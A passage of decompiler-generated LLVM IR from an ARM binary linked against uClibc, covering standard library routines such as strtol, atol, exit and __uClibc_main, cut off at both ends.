  store i32 %v0_bdb0, i32* %v3_bdb0, align 4
  %v0_bdb4 = load i32, i32* @r5, align 4
  store i32 %v0_bdb4, i32* %r1.global-to-local, align 4
  %v0_bdb8 = load i32, i32* @r0, align 4
  %v2_bdb8 = inttoptr i32 %v0_bdb8 to i32*
  %v3_bdb8 = call i32 @srandom_r(i32* %v2_bdb8, i32 %v0_bdb4)
  store i32 %v3_bdb8, i32* %r0.global-to-local, align 4
  %v0_bdbc = load i32, i32* @r4, align 4
  %v2_bdbc = icmp eq i32 %v0_bdbc, 0
  br i1 %v2_bdbc, label %bb26, label %.thread4

bb26:                                             ; preds = %bb25
  %v1_bdd812 = load i32, i32* @r7, align 4
  %v2_bdd813 = inttoptr i32 %v1_bdd812 to i32*
  store i32 0, i32* %v2_bdd813, align 4
  %v1_bddc = load i32, i32* @r4, align 4
  store i32 %v1_bddc, i32* %r0.global-to-local, align 4
  br label %bb27

.thread4:                                         ; preds = %bb25
  %v1_bdc0 = load i32, i32* @r5, align 4
  %v2_bdc0 = add i32 %v1_bdc0, 4
  %v3_bdc0 = inttoptr i32 %v2_bdc0 to i32*
  %v4_bdc0 = load i32, i32* %v3_bdc0, align 4
  %v1_bdc4 = load i32, i32* @r6, align 4
  %v3_bdc4 = sub i32 %v4_bdc0, %v1_bdc4
  %v4_bdc8 = sdiv i32 %v3_bdc4, 4
  store i32 5, i32* %r2.global-to-local, align 4
  %v4_bdd0 = mul i32 %v4_bdc8, 5
  %v5_bdd0 = add i32 %v4_bdd0, %v0_bdbc
  store i32 %v5_bdd0, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  %v1_bdd8 = load i32, i32* @r7, align 4
  %v2_bdd8 = inttoptr i32 %v1_bdd8 to i32*
  store i32 0, i32* %v2_bdd8, align 4
  %v1_bde0 = load i32, i32* %r3.global-to-local, align 4
  %v2_bde0 = load i32, i32* @r7, align 4
  %v3_bde0 = inttoptr i32 %v2_bde0 to i32*
  store i32 %v1_bde0, i32* %v3_bde0, align 4
  %v17_bde4.pre = load i32, i32* %r0.global-to-local, align 4
  br label %bb27

bb27:                                             ; preds = %bb26, %.thread4
  %v17_bde4 = phi i32 [ %v1_bddc, %bb26 ], [ %v17_bde4.pre, %.thread4 ]
  %v2_bde4 = load i32, i32* %stack_var_-20, align 4
  store i32 %v2_bde4, i32* %r4.global-to-local, align 4
  ret i32 %v17_bde4

dec_label_pc_bde8:                                ; preds = %dec_label_pc_bd6c
  %v0_bde8 = call i32 @__errno_location()
  store i32 %v0_bde8, i32* %r0.global-to-local, align 4
  store i32 22, i32* %r4.global-to-local, align 4
  %v2_bdf0 = inttoptr i32 %v0_bde8 to i32*
  store i32 22, i32* %v2_bdf0, align 4
  %v0_bdf4 = call i32 @__errno_location()
  %v0_bdf8 = load i32, i32* %r4.global-to-local, align 4
  %v2_bdf8 = inttoptr i32 %v0_bdf4 to i32*
  store i32 %v0_bdf8, i32* %v2_bdf8, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_be00 = load i32, i32* %stack_var_-20, align 4
  store i32 %v2_be00, i32* %r4.global-to-local, align 4
  ret i32 -1

; uselistorder directives
  uselistorder i1 %v7_bd7c, { 1, 0 }
  uselistorder i1 %v7_bd54, { 1, 0 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 4, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 0 }
  uselistorder i32* %r0.global-to-local, { 0, 4, 2, 3, 1, 5 }
  uselistorder i32 add (i32 ptrtoint (i32* @global_var_12488.156 to i32), i32 20), { 1, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_12488.156 to i32), { 2, 3, 1, 0 }
  uselistorder i32 %arg2, { 5, 6, 0, 1, 4, 3, 2, 7 }
  uselistorder label %bb27, { 1, 0 }
  uselistorder label %bb25, { 4, 3, 0, 1, 2 }
  uselistorder label %bb23, { 1, 0 }
  uselistorder label %bb20, { 1, 0 }
}

define i32 @atol(i32 %arg1) local_unnamed_addr {
entry:
  store i32 0, i32* @r1, align 4
  store i32 10, i32* @r2, align 4
  %v0_be10 = call i32 @strtol()
  ret i32 %v0_be10
}

define i32 @strtol() local_unnamed_addr {
entry:
  store i32 1, i32* @r3, align 4
  %v0_be18 = call i32 @_stdlib_strto_l()
  ret i32 %v0_be18
}

define i32 @_stdlib_strto_l() local_unnamed_addr {
entry:
  %fp.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %v3_be1c = load i32, i32* @r4, align 4
  store i32 %v3_be1c, i32* %stack_var_-36, align 4
  %v0_be20 = load i32, i32* @r1, align 4
  store i32 %v0_be20, i32* %sb.global-to-local, align 4
  %v0_be24 = load i32, i32* @r2, align 4
  store i32 %v0_be24, i32* %r5.global-to-local, align 4
  %v0_be28 = load i32, i32* @r3, align 4
  store i32 %v0_be28, i32* %fp.global-to-local, align 4
  %v0_be2c = load i32, i32* @r0, align 4
  %v2_be40.pre = load i32, i32* @global_var_1b514, align 4
  br label %dec_label_pc_be38

dec_label_pc_be38:                                ; preds = %dec_label_pc_be38, %entry
  %v0_be70 = phi i32 [ %v0_be2c, %entry ], [ %v1_be34, %dec_label_pc_be38 ]
  store i32 %v0_be70, i32* %r4.global-to-local, align 4
  %v1_be3c = inttoptr i32 %v0_be70 to i8*
  %v2_be3c = load i8, i8* %v1_be3c, align 1
  %v3_be3c = zext i8 %v2_be3c to i32
  %v3_be44 = mul nuw nsw i32 %v3_be3c, 2
  %v4_be44 = add i32 %v3_be44, %v2_be40.pre
  %v5_be44 = inttoptr i32 %v4_be44 to i8*
  %v6_be44 = load i8, i8* %v5_be44, align 1
  %v1_be48 = and i8 %v6_be44, 32
  %v2_be48 = icmp eq i8 %v1_be48, 0
  %v1_be34 = add i32 %v0_be70, 1
  br i1 %v2_be48, label %dec_label_pc_be50, label %dec_label_pc_be38

dec_label_pc_be50:                                ; preds = %dec_label_pc_be38
  %v7_be50 = icmp eq i8 %v2_be3c, 43
  br i1 %v7_be50, label %dec_label_pc_be70, label %dec_label_pc_be58

dec_label_pc_be58:                                ; preds = %dec_label_pc_be50
  %v7_be58 = icmp eq i8 %v2_be3c, 45
  br i1 %v7_be58, label %dec_label_pc_be70, label %bb

bb:                                               ; preds = %dec_label_pc_be58
  store i32 0, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_be74

dec_label_pc_be70:                                ; preds = %dec_label_pc_be50, %dec_label_pc_be58
  %storemerge44 = phi i32 [ 1, %dec_label_pc_be58 ], [ 0, %dec_label_pc_be50 ]
  store i32 %storemerge44, i32* %r7.global-to-local, align 4
  store i32 %v1_be34, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_be74

dec_label_pc_be74:                                ; preds = %bb, %dec_label_pc_be70
  %v0_be94 = phi i32 [ %v0_be70, %bb ], [ %v1_be34, %dec_label_pc_be70 ]
  %v1_be74 = and i32 %v0_be24, -17
  %v3_be74 = icmp eq i32 %v1_be74, 0
  br i1 %v3_be74, label %dec_label_pc_be80, label %bb55

bb55:                                             ; preds = %dec_label_pc_be74
  br label %bb59

dec_label_pc_be80:                                ; preds = %dec_label_pc_be74
  %v1_be80 = inttoptr i32 %v0_be94 to i8*
  %v2_be80 = load i8, i8* %v1_be80, align 1
  %v7_be84 = icmp eq i8 %v2_be80, 48
  %v1_be88 = add i32 %v0_be24, 10
  store i32 %v1_be88, i32* %r5.global-to-local, align 4
  br i1 %v7_be84, label %dec_label_pc_be94, label %bb56

bb56:                                             ; preds = %dec_label_pc_be80
  br label %.thread9

dec_label_pc_be94:                                ; preds = %dec_label_pc_be80
  %v1_be94 = add i32 %v0_be94, 1
  %v2_be94 = inttoptr i32 %v1_be94 to i8*
  %v3_be94 = load i8, i8* %v2_be94, align 1
  %v4_be94 = zext i8 %v3_be94 to i32
  store i32 %v1_be94, i32* %r4.global-to-local, align 4
  %v1_be98 = or i32 %v4_be94, 32
  %v7_be9c = icmp eq i32 %v1_be98, 120
  %v1_bea0 = add i32 %v0_be24, 8
  store i32 %v1_bea0, i32* %r5.global-to-local, align 4
  br i1 %v7_be9c, label %bb57, label %.thread9

bb57:                                             ; preds = %dec_label_pc_be94
  %v3_beac = mul i32 %v1_bea0, 2
  store i32 %v3_beac, i32* %r5.global-to-local, align 4
  %v2_beb0 = add i32 %v0_be94, 2
  store i32 %v2_beb0, i32* %r4.global-to-local, align 4
  br label %.thread9

.thread9:                                         ; preds = %dec_label_pc_be94, %bb56, %bb57
  %v1_bf7429 = phi i32 [ %v0_be2c, %bb56 ], [ %v1_be94, %bb57 ], [ %v1_be94, %dec_label_pc_be94 ]
  %v0_befc20 = phi i32 [ %v0_be94, %bb56 ], [ %v2_beb0, %bb57 ], [ %v1_be94, %dec_label_pc_be94 ]
  %v0_beb4 = phi i32 [ %v1_be88, %bb56 ], [ %v3_beac, %bb57 ], [ %v1_bea0, %dec_label_pc_be94 ]
  %v5_beb8 = icmp slt i32 %v0_beb4, 16
  br i1 %v5_beb8, label %bb59, label %bb58

bb58:                                             ; preds = %.thread9
  store i32 16, i32* %r5.global-to-local, align 4
  br label %bb59

bb59:                                             ; preds = %bb55, %.thread9, %bb58
  %v1_bf7428 = phi i32 [ %v0_be2c, %bb55 ], [ %v1_bf7429, %.thread9 ], [ %v1_bf7429, %bb58 ]
  %v0_befc19 = phi i32 [ %v0_be94, %bb55 ], [ %v0_befc20, %.thread9 ], [ %v0_befc20, %bb58 ]
  %v0_becc = phi i32 [ %v0_be24, %bb55 ], [ %v0_beb4, %.thread9 ], [ 16, %bb58 ]
  %v1_bebc = add i32 %v0_becc, -2
  %tmp = icmp ugt i32 %v1_bebc, 34
  br i1 %tmp, label %.thread, label %dec_label_pc_becc

.thread:                                          ; preds = %bb59
  store i32 0, i32* @ip, align 4
  br label %dec_label_pc_bf70

dec_label_pc_becc:                                ; preds = %bb59
  %v2_bed4 = urem i32 -1, %v0_becc
  %v1_bee4 = urem i32 %v2_bed4, 256
  store i32 %v1_bee4, i32* %sl.global-to-local, align 4
  %v2_bee8 = udiv i32 -1, %v0_becc
  store i32 0, i32* @ip, align 4
  store i32 %v2_bee8, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_befc

dec_label_pc_bef8:                                ; preds = %bb66, %dec_label_pc_bf58
  %v0_bef8 = phi i32 [ %v1_bf28, %bb66 ], [ %v0_bef8.pre, %dec_label_pc_bf58 ]
  br label %dec_label_pc_befc

dec_label_pc_befc:                                ; preds = %dec_label_pc_becc, %dec_label_pc_bef8
  %v1_bf7426 = phi i32 [ %v1_bf7428, %dec_label_pc_becc ], [ %v0_bef8, %dec_label_pc_bef8 ]
  %v0_bf28 = phi i32 [ %v0_befc19, %dec_label_pc_becc ], [ %v0_bef8, %dec_label_pc_bef8 ]
  %v1_befc = inttoptr i32 %v0_bf28 to i8*
  %v2_befc = load i8, i8* %v1_befc, align 1
  %v3_befc = zext i8 %v2_befc to i32
  %v1_bf00 = add nsw i32 %v3_befc, -48
  %v1_bf04 = urem i32 %v1_bf00, 256
  %v1_bf0c = or i32 %v3_befc, 32
  %tmp74 = icmp ult i32 %v1_bf04, 10
  br i1 %tmp74, label %bb61, label %dec_label_pc_bf14

dec_label_pc_bf14:                                ; preds = %dec_label_pc_befc
  %tmp75 = icmp ugt i32 %v1_bf0c, 96
  br i1 %tmp75, label %bb60, label %bb61

bb60:                                             ; preds = %dec_label_pc_bf14
  %v1_bf18 = add nsw i32 %v1_bf0c, -87
  %v5_bf20 = urem i32 %v1_bf18, 256
  br label %bb61

bb61:                                             ; preds = %dec_label_pc_befc, %dec_label_pc_bf14, %bb60
  %v3_bf50 = phi i32 [ %v1_bf04, %dec_label_pc_befc ], [ 40, %dec_label_pc_bf14 ], [ %v5_bf20, %bb60 ]
  %v1_bf24 = load i32, i32* %r5.global-to-local, align 4
  %v1_bf28 = add i32 %v0_bf28, 1
  store i32 %v1_bf28, i32* %r4.global-to-local, align 4
  %v6_bf2c = icmp slt i32 %v3_bf50, %v1_bf24
  br i1 %v6_bf2c, label %dec_label_pc_bf30, label %dec_label_pc_bf70.loopexit

dec_label_pc_bf30:                                ; preds = %bb61
  %v0_bf30 = load i32, i32* @ip, align 4
  %v1_bf30 = load i32, i32* %r8.global-to-local, align 4
  %v9_bf30 = icmp eq i32 %v0_bf30, %v1_bf30
  br i1 %v9_bf30, label %.thread38, label %bb62

.thread38:                                        ; preds = %dec_label_pc_bf30
  br label %dec_label_pc_bf40

bb62:                                             ; preds = %dec_label_pc_bf30
  %v3_bf30 = icmp ult i32 %v0_bf30, %v1_bf30
  br i1 %v3_bf30, label %dec_label_pc_bf40, label %dec_label_pc_bf58

dec_label_pc_bf40:                                ; preds = %bb62, %.thread38
  %v4_bf482341 = phi i32 [ 1, %.thread38 ], [ 0, %bb62 ]
  %v1_bf40 = load i32, i32* %sl.global-to-local, align 4
  %v3_bf40 = icmp uge i32 %v3_bf50, %v1_bf40
  %v9_bf40 = icmp eq i32 %v3_bf50, %v1_bf40
  %v2_bf44 = xor i1 %v3_bf40, true
  %v3_bf44 = or i1 %v9_bf40, %v2_bf44
  br i1 %v3_bf44, label %bb63, label %bb64

bb63:                                             ; preds = %dec_label_pc_bf40
  br label %bb64

bb64:                                             ; preds = %dec_label_pc_bf40, %bb63
  %v4_bf48 = phi i32 [ %v4_bf482341, %dec_label_pc_bf40 ], [ 0, %bb63 ]
  %v2_bf48 = xor i1 %v9_bf40, true
  %v3_bf48 = and i1 %v3_bf40, %v2_bf48
  br i1 %v3_bf48, label %bb65, label %thread-pre-split

bb65:                                             ; preds = %bb64
  %v5_bf48 = urem i32 %v4_bf48, 2
  br label %thread-pre-split

thread-pre-split:                                 ; preds = %bb64, %bb65
  %v0_bf4c = phi i32 [ %v5_bf48, %bb65 ], [ %v4_bf48, %bb64 ]
  %v2_bf4c = icmp eq i32 %v0_bf4c, 0
  br i1 %v2_bf4c, label %bb66, label %dec_label_pc_bf58

bb66:                                             ; preds = %thread-pre-split
  %v4_bf50 = mul i32 %v0_bf30, %v1_bf24
  %v5_bf50 = add i32 %v4_bf50, %v3_bf50
  store i32 %v5_bf50, i32* @ip, align 4
  br label %dec_label_pc_bef8

dec_label_pc_bf58:                                ; preds = %bb62, %thread-pre-split
  %v0_bf58 = call i32 @__errno_location()
  %v0_bf5c = load i32, i32* %r7.global-to-local, align 4
  %v1_bf5c = load i32, i32* %fp.global-to-local, align 4
  %v2_bf5c = and i32 %v1_bf5c, %v0_bf5c
  store i32 %v2_bf5c, i32* %r7.global-to-local, align 4
  store i32 -1, i32* @ip, align 4
  %v2_bf68 = inttoptr i32 %v0_bf58 to i32*
  store i32 34, i32* %v2_bf68, align 4
  %v0_bef8.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_bef8

dec_label_pc_bf70.loopexit:                       ; preds = %bb61
  %v0_bf70.pre = load i32, i32* %sb.global-to-local, align 4
  br label %dec_label_pc_bf70

dec_label_pc_bf70:                                ; preds = %.thread, %dec_label_pc_bf70.loopexit
  %v1_bf74 = phi i32 [ %v1_bf7426, %dec_label_pc_bf70.loopexit ], [ %v1_bf7428, %.thread ]
  %v2_bf74 = phi i32 [ %v0_bf70.pre, %dec_label_pc_bf70.loopexit ], [ %v0_be20, %.thread ]
  %v2_bf70 = icmp eq i32 %v2_bf74, 0
  br i1 %v2_bf70, label %bb68, label %bb67

bb67:                                             ; preds = %dec_label_pc_bf70
  %v3_bf74 = inttoptr i32 %v2_bf74 to i32*
  store i32 %v1_bf74, i32* %v3_bf74, align 4
  br label %bb68

bb68:                                             ; preds = %dec_label_pc_bf70, %bb67
  %v0_bf78 = load i32, i32* %r7.global-to-local, align 4
  %v2_bf78 = icmp eq i32 %v0_bf78, 0
  %. = select i1 %v2_bf78, i32 2147483647, i32 -2147483648
  store i32 %., i32* %r4.global-to-local, align 4
  %v0_bf84 = load i32, i32* %fp.global-to-local, align 4
  %v2_bf84 = icmp eq i32 %v0_bf84, 0
  %v0_bfa8.pre.pre = load i32, i32* @ip, align 4
  br i1 %v2_bf84, label %dec_label_pc_bfa0, label %bb71

bb71:                                             ; preds = %bb68
  %tmp76 = icmp ugt i32 %v0_bfa8.pre.pre, %.
  br i1 %tmp76, label %dec_label_pc_bf90, label %dec_label_pc_bfa0

dec_label_pc_bf90:                                ; preds = %bb71
  %v0_bf90 = call i32 @__errno_location()
  %v2_bf98 = inttoptr i32 %v0_bf90 to i32*
  store i32 34, i32* %v2_bf98, align 4
  %v0_bf9c = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_bf9c, i32* @ip, align 4
  %v0_bfa0.pre = load i32, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_bfa0

dec_label_pc_bfa0:                                ; preds = %bb71, %bb68, %dec_label_pc_bf90
  %v0_bfa8.pre = phi i32 [ %v0_bfa8.pre.pre, %bb71 ], [ %v0_bf9c, %dec_label_pc_bf90 ], [ %v0_bfa8.pre.pre, %bb68 ]
  %v0_bfa0 = phi i32 [ %v0_bf78, %bb71 ], [ %v0_bfa0.pre, %dec_label_pc_bf90 ], [ %v0_bf78, %bb68 ]
  %v2_bfa0 = icmp eq i32 %v0_bfa0, 0
  br i1 %v2_bfa0, label %dec_label_pc_bfa0._crit_edge, label %bb72

bb72:                                             ; preds = %dec_label_pc_bfa0
  %v2_bfa4 = sub i32 0, %v0_bfa8.pre
  store i32 %v2_bfa4, i32* @ip, align 4
  br label %dec_label_pc_bfa0._crit_edge

dec_label_pc_bfa0._crit_edge:                     ; preds = %dec_label_pc_bfa0, %bb72
  %v0_bfa8 = phi i32 [ %v2_bfa4, %bb72 ], [ %v0_bfa8.pre, %dec_label_pc_bfa0 ]
  %v2_bfac = load i32, i32* %stack_var_-36, align 4
  store i32 %v2_bfac, i32* @r4, align 4
  ret i32 %v0_bfa8

; uselistorder directives
  uselistorder i32 %v0_bfa8.pre, { 1, 0 }
  uselistorder i32 %v0_bfa8.pre.pre, { 1, 2, 0 }
  uselistorder i32 %v4_bf48, { 1, 0 }
  uselistorder i1 %v3_bf40, { 1, 0 }
  uselistorder i32 %v1_bf40, { 1, 0 }
  uselistorder i32 %v1_bf28, { 1, 0 }
  uselistorder i32 %v1_bf0c, { 1, 0 }
  uselistorder i32 %v1_bf04, { 1, 0 }
  uselistorder i32 %v0_bef8, { 1, 0 }
  uselistorder i32 %v0_becc, { 1, 0, 2 }
  uselistorder i32 %v3_beac, { 1, 0 }
  uselistorder i32 %v1_bea0, { 1, 0, 2 }
  uselistorder i32 %v0_be94, { 2, 0, 1, 3, 4 }
  uselistorder i32 %v1_be34, { 1, 0, 2 }
  uselistorder i32 %v0_be2c, { 1, 0, 2 }
  uselistorder i32 %v0_be24, { 1, 0, 2, 3, 4 }
  uselistorder i32* %r7.global-to-local, { 2, 3, 5, 4, 1, 0 }
  uselistorder i32* %r5.global-to-local, { 4, 1, 2, 3, 5, 0 }
  uselistorder i32* %r4.global-to-local, { 0, 1, 4, 5, 6, 7, 2, 3 }
  uselistorder label %dec_label_pc_bfa0._crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_bfa0, { 2, 0, 1 }
  uselistorder label %bb68, { 1, 0 }
  uselistorder label %dec_label_pc_bf70, { 1, 0 }
  uselistorder label %dec_label_pc_bf58, { 1, 0 }
  uselistorder label %thread-pre-split, { 1, 0 }
  uselistorder label %bb64, { 1, 0 }
  uselistorder label %bb61, { 2, 1, 0 }
  uselistorder label %dec_label_pc_befc, { 1, 0 }
  uselistorder label %dec_label_pc_bef8, { 1, 0 }
  uselistorder label %bb59, { 2, 1, 0 }
  uselistorder label %.thread9, { 2, 0, 1 }
  uselistorder label %dec_label_pc_be74, { 1, 0 }
  uselistorder label %dec_label_pc_be70, { 1, 0 }
}

define i32 @__GI_exit(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-16 = alloca i32, align 4
  %v2_bfb4 = ptrtoint i32* %stack_var_-16 to i32
  store i32 %arg1, i32* @r4, align 4
  store i32 %v2_bfb4, i32* @r0, align 4
  %v1_bfd0 = call i32 @__pthread_return_void()
  %v1_bfe0 = call i32 @__pthread_return_0()
  %v2_bfe8 = load i32, i32* @global_var_1baac.169, align 4
  %v2_bfec = icmp eq i32 %v2_bfe8, 0
  br i1 %v2_bfec, label %.thread1, label %bb

bb:                                               ; preds = %entry
  call void @__pseudo_branch(i32 %v2_bfe8)
  br label %.thread1

.thread1:                                         ; preds = %entry, %bb
  store i32 %v2_bfb4, i32* @r0, align 4
  %v1_c00c = call i32 @__pthread_return_void()
  store i32 %v1_c00c, i32* @r0, align 4
  %v1_c010 = call i32 @__GI___uClibc_fini(i32 %v1_c00c)
  store i32 49188, i32* @lr, align 4
  %v2_c020 = call i32 @_stdio_term()
  %v0_c024 = load i32, i32* @r4, align 4
  %v1_c028 = call i32 @__GI__exit(i32 %v0_c024)
  unreachable

; uselistorder directives
  uselistorder i32 (i32)* @__GI__exit, { 0, 3, 2, 1 }
  uselistorder label %.thread1, { 1, 0 }
}

define i32 @__GI___uClibc_fini(i32 %arg1) local_unnamed_addr {
dec_label_pc_c074:
  %stack_var_-8 = alloca i32, align 4
  %v3_c048 = load i32, i32* @r4, align 4
  store i32 %v3_c048, i32* %stack_var_-8, align 4
  %v2_c078 = load i32, i32* @global_var_1babc.178, align 4
  %v2_c07c = icmp eq i32 %v2_c078, 0
  br i1 %v2_c07c, label %.thread, label %bb

bb:                                               ; preds = %dec_label_pc_c074
  call void @__pseudo_branch(i32 %v2_c078)
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_c074, %bb
  %v2_c08c = load i32, i32* @global_var_1bac0.180, align 4
  %v2_c090 = icmp eq i32 %v2_c08c, 0
  br i1 %v2_c090, label %bb12, label %bb13

bb12:                                             ; preds = %.thread
  %v3_c094 = load i32, i32* %stack_var_-8, align 4
  store i32 %v3_c094, i32* @r4, align 4
  %v9_c094 = load i32, i32* @r0, align 4
  ret i32 %v9_c094

bb13:                                             ; preds = %.thread
  call void @__pseudo_branch(i32 %v2_c08c)
  %v2_c0a0 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_c0a0, i32* @r4, align 4
  %v8_c0a0 = load i32, i32* @r0, align 4
  ret i32 %v8_c0a0

; uselistorder directives
  uselistorder label %.thread, { 1, 0 }
}

define i32 @__pthread_return_0() local_unnamed_addr {
entry:
  ret i32 0
}

define i32 @__pthread_return_void() local_unnamed_addr {
entry:
  %v1_c0bc = load i32, i32* @r0, align 4
  ret i32 %v1_c0bc
}

define i32 @__check_one_fd(i32 %arg1, i16* %arg2) local_unnamed_addr {
entry:
  %r5.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i16* %arg2 to i32
  %stack_var_-12 = alloca i32, align 4
  %v3_c0c0 = load i32, i32* @r4, align 4
  store i32 %v3_c0c0, i32* %stack_var_-12, align 4
  store i32 %tmp, i32* @r4, align 4
  store i32 %arg1, i32* %r5.global-to-local, align 4
  %v2_c0d0 = call i32 @__libc_fcntl(i32 %arg1, i32 1)
  %v7_c0d4 = icmp eq i32 %v2_c0d0, -1
  br i1 %v7_c0d4, label %bb5, label %bb

bb:                                               ; preds = %entry
  %v3_c0d8 = load i32, i32* %stack_var_-12, align 4
  store i32 %v3_c0d8, i32* @r4, align 4
  ret i32 %v2_c0d0

bb5:                                              ; preds = %entry
  %v0_c0dc = load i32, i32* @r4, align 4
  %v1_c0dc = inttoptr i32 %v0_c0dc to i16*
  %v5_c0e4 = call i32 @__libc_open(i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_124b0.183, i32 0, i32 0), i32 %v0_c0dc)
  %v1_c0e8 = load i32, i32* %r5.global-to-local, align 4
  %v9_c0e8 = icmp eq i32 %v5_c0e4, %v1_c0e8
  br i1 %v9_c0e8, label %bb6, label %bb7

bb6:                                              ; preds = %bb5
  %v3_c0ec = load i32, i32* %stack_var_-12, align 4
  store i32 %v3_c0ec, i32* @r4, align 4
  ret i32 %v5_c0e4

bb7:                                              ; preds = %bb5
  %v0_c0f0 = call i32 @abort()
  %v0_c0f4 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_c0f4, label %bb8, label %bb9

bb8:                                              ; preds = %bb7
  %v1_c0f4 = load i32, i32* @r2, align 4
  %v2_c0f4 = trunc i32 %v1_c0f4 to i16
  store i16 %v2_c0f4, i16* %v1_c0dc, align 2
  br label %bb9

bb9:                                              ; preds = %bb7, %bb8
  ret i32 %v0_c0f0

; uselistorder directives
  uselistorder i32 %v2_c0d0, { 1, 0 }
  uselistorder i32 ()* @abort, { 2, 1, 0, 3 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %bb9, { 1, 0 }
}

define i32 @__GI___uClibc_init(i32 %arg1) local_unnamed_addr {
entry:
  %v2_c0fc = load i32, i32* @global_var_1bac4.185, align 4
  %v2_c100 = icmp eq i32 %v2_c0fc, 0
  br i1 %v2_c100, label %bb3, label %bb

bb:                                               ; preds = %entry
  %v6_c10c = load i32, i32* @r0, align 4
  ret i32 %v6_c10c

bb3:                                              ; preds = %entry
  store i32 1, i32* @global_var_1bac4.185, align 4
  store i32 4096, i32* @global_var_1bab8.107, align 4
  %v0_c140 = call i32 @_stdio_init()
  ret i32 %v0_c140
}

define i32 @__uClibc_main(i32 %arg1, i32 %arg2, i32* %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
entry:
  %tmp = ptrtoint i32* %arg3 to i32
  %tmp35 = call i32 @__decompiler_undefined_function_0()
  %tmp36 = call i32 @__decompiler_undefined_function_0()
  %tmp37 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-120 = alloca i32, align 4
  store i32 %tmp, i32* @r6, align 4
  %v4_c158 = mul i32 %arg2, 4
  %v5_c158 = add i32 %tmp, %v4_c158
  %v2_c15c = load i32, i32* %arg3, align 4
  %v2_c160 = ptrtoint i32* %stack_var_-120 to i32
  %v1_c164 = add i32 %v5_c158, 4
  store i32 %v1_c164, i32* @ip, align 4
  %v9_c168 = icmp eq i32 %v1_c164, %v2_c15c
  store i32 %arg2, i32* @r8, align 4
  store i32 %arg7, i32* @global_var_1bab0.191, align 4
  store i32 %v1_c164, i32* @global_var_1bab4.193, align 4
  store i32 %arg6, i32* @global_var_1bac0.180, align 4
  store i32 120, i32* @r2, align 4
  br i1 %v9_c168, label %bb, label %bb41

bb:                                               ; preds = %entry
  store i32 %v5_c158, i32* @global_var_1bab4.193, align 4
  br label %bb41

bb41:                                             ; preds = %entry, %bb
  store i32 %arg4, i32* @r7, align 4
  %v2_c1a8 = bitcast i32* %stack_var_-120 to i8*
  %v3_c1a8 = call i32 @__GI_memset(i8* %v2_c1a8, i32 0)
  %storemerge.pre = load i32, i32* @global_var_1bab4.193, align 4
  br label %dec_label_pc_c1b8

dec_label_pc_c1b8:                                ; preds = %dec_label_pc_c1b8, %bb41
  %storemerge = phi i32 [ %storemerge.pre, %bb41 ], [ %v4_c1b8, %dec_label_pc_c1b8 ]
  %v1_c1b8 = inttoptr i32 %storemerge to i32*
  %v2_c1b8 = load i32, i32* %v1_c1b8, align 4
  %v4_c1b8 = add i32 %storemerge, 4
  %v2_c1bc = icmp eq i32 %v2_c1b8, 0
  br i1 %v2_c1bc, label %dec_label_pc_c1c8, label %dec_label_pc_c1b8

dec_label_pc_c1c8:                                ; preds = %dec_label_pc_c1b8
  store i32 %v4_c1b8, i32* @r4, align 4
  %v1_c1e822 = inttoptr i32 %v4_c1b8 to i32*
  %v2_c1e823 = load i32, i32* %v1_c1e822, align 4
  %v2_c1ec25 = icmp eq i32 %v2_c1e823, 0
  br i1 %v2_c1ec25, label %dec_label_pc_c1f4, label %dec_label_pc_c1d0

dec_label_pc_c1d0:                                ; preds = %dec_label_pc_c1c8, %dec_label_pc_c1e8
  %v5_c1d4 = phi i32 [ %v2_c1e8, %dec_label_pc_c1e8 ], [ %v2_c1e823, %dec_label_pc_c1c8 ]
  %v2_c1d0 = icmp ugt i32 %v5_c1d4, 13
  %v7_c1d0 = icmp eq i32 %v5_c1d4, 14
  %v2_c1d4 = xor i1 %v2_c1d0, true
  %v3_c1d4 = or i1 %v7_c1d0, %v2_c1d4
  br i1 %v3_c1d4, label %bb42, label %bb43

bb42:                                             ; preds = %dec_label_pc_c1d0
  %v6_c1d4 = and i32 %v5_c1d4, 536870912
  %v7_c1d4 = icmp ne i32 %v6_c1d4, 0
  br label %bb43

bb43:                                             ; preds = %dec_label_pc_c1d0, %bb42
  %v1_c1e0 = phi i1 [ %v2_c1d0, %dec_label_pc_c1d0 ], [ %v7_c1d4, %bb42 ]
  %v2_c1d8 = xor i1 %v1_c1e0, true
  %v3_c1d8 = or i1 %v7_c1d0, %v2_c1d8
  br i1 %v3_c1d8, label %bb44, label %dec_label_pc_c1e8

bb44:                                             ; preds = %bb43
  br label %dec_label_pc_c1e8

dec_label_pc_c1e8:                                ; preds = %bb43, %bb44
  call void @__pseudo_cond_branch(i1 %v3_c1d8, i32 ptrtoint (i32* @global_var_ab10.195 to i32))
  %v0_c1e4 = load i32, i32* @r4, align 4
  %v1_c1e4 = add i32 %v0_c1e4, 8
  store i32 %v1_c1e4, i32* @r4, align 4
  %v1_c1e8 = inttoptr i32 %v1_c1e4 to i32*
  %v2_c1e8 = load i32, i32* %v1_c1e8, align 4
  %v2_c1ec = icmp eq i32 %v2_c1e8, 0
